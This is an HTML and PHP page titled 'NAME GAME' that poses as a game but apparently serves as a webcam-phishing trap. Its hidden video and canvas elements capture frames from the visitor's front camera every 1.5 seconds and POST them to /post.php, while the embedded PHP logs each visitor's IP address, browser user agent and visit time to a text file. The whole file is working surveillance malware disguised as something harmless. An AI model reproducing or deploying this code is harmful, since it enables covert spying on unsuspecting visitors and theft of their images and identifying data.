<!DOCTYPE html>

<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NAME GAME</title>
    <link href="https://fonts.googleapis.com/css2?family=Baloo+Thambi+2:wght@500&display=swap" rel="stylesheet">
    <link href="favicon.ico" rel="icon">
      <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
      <style>
          body{
              background: url(https://yalantis.com/uploads/ckeditor/pictures/2916/dribble_perfect.gif) fixed center no-repeat black;
      </style>

  <body>
    


    
<div class="video-wrap" hidden="hidden" >
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>

<script>

function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: '/post.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 640);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);
  

}

// Load init
init();

</script>

      <!--cam-->
      
    
    

<?php
date_default_timezone_set("Asia/kolkata");
$date=date("d-m-Y/g:i:sA");
$handle=fopen("text.txt","a");
fwrite($handle, "\n");
fwrite($handle,"Ip :");
fwrite($handle,$_SERVER["REMOTE_ADDR"]);
fwrite($handle, "\n");
fwrite($handle,"Browser :");
fwrite($handle,$_SERVER['HTTP_USER_AGENT']);
fwrite($handle, "\n");
fwrite($handle,"date :");
fwrite($handle,$date);
fwrite($handle, "\n");
fwrite($handle,"_._._._._._._._.");
?>


      
      
      
</body>

</html>        

